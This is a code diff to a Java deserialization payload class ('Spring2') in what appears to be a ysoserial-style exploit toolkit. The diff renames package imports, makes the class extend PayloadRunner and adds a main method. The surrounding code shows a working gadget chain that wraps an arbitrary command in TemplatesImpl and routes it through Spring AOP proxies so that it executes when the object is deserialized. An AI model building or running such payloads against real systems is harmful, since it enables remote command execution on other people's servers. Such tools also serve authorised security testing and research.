@@ -8,15 +8,16 @@ import java.lang.reflect.Type;
 
 import javax.xml.transform.Templates;
 
+import A.R.ysogate.payloads.utils.PayloadRunner;
 import org.springframework.aop.framework.AdvisedSupport;
 import org.springframework.aop.target.SingletonTargetSource;
 
 import A.R.ysogate.payloads.ObjectPayload;
 import A.R.ysogate.payloads.annotation.Authors;
 import A.R.ysogate.payloads.annotation.Dependencies;
-import A.R.ysogate.payloads.util.Gadgets;
-import A.R.ysogate.payloads.util.JavaVersion;
-import A.R.ysogate.payloads.util.Reflections;
+import A.R.ysogate.payloads.utils.Gadgets;
+import A.R.ysogate.payloads.utils.JavaVersion;
+import A.R.ysogate.payloads.utils.Reflections;
 
 
 /**
@@ -40,7 +41,7 @@ import A.R.ysogate.payloads.util.Reflections;
 		"aopalliance:aopalliance:1.0", "commons-logging:commons-logging:1.2"
 })
 @Authors({Authors.MBECHLER})
-public class Spring2 implements ObjectPayload<Object> {
+public class Spring2 extends PayloadRunner implements ObjectPayload<Object> {
 
 	public Object getObject(final String command) throws Exception {
 		final Object templates = Gadgets.createTemplatesImpl(command);
@@ -61,6 +62,10 @@ public class Spring2 implements ObjectPayload<Object> {
 		Reflections.setFieldValue(mitp, "provider", typeProviderProxy);
 		Reflections.setFieldValue(mitp, "methodName", "newTransformer");
 		return mitp;
+	}
+
+	public static void main(final String[] args) throws Exception {
+		PayloadRunner.run(Spring2.class, args);
 	}
 
 	public static boolean isApplicableJavaVersion() {
